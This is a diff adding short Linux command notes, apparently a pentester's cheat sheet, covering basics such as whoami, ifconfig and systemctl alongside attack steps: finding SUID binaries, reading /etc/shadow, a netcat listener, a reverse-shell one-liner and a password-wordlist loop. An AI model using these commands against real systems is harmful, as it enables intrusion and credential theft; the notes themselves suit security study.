@@ -1,0 +1,56 @@
+To see the currently logged-in user:
+- Whoami
+
+To see the current working directory path: 
+- pwd
+
+Used to configure a network interface:
+- ifconfig
+ifconfig eth0 down
+ifconfig eth0 up
+
+Release assigned IP address :
+- sudo dhclient -r 
+
+Demand an new IP adddress: 
+- sudo dhclient
+
+Start/Stop a servive :
+- systemctl start SERVICE 
+- systemctl stop SERVICE
+
+Change user:
+- to root : su root / su -
+- to user : su user
+
+Search for a file in all folders:
+- find / -type f -name FILENAME 2> /dev/null
+
+To know which file we can execute as root:
+- find / -type f -perm -4000 2>/dev/null
+
+important files to see in a pentest: 
+
+/etc/passwd
+/etc/shadow
+/etc/crontab
+
+Get an RDP connection from Linux to Windows:
+- xfreerdp /u:<username> /p:<password> /v:<ip adresse> +clipboard
+
+Open a Web server with python :
+- python3 -m http.server
+
+download a file from a web server :
+- wget URL:PORT
+
+open port :
+- nc -nvlp PORT
+
+afford a shell to a port listening:
+- nc IP PORT -e /bin/bash
+
+Creat a loop :
+- for year in $(seq 2000 2025);do echo "toto$year" >> pass.txt;done
+
+
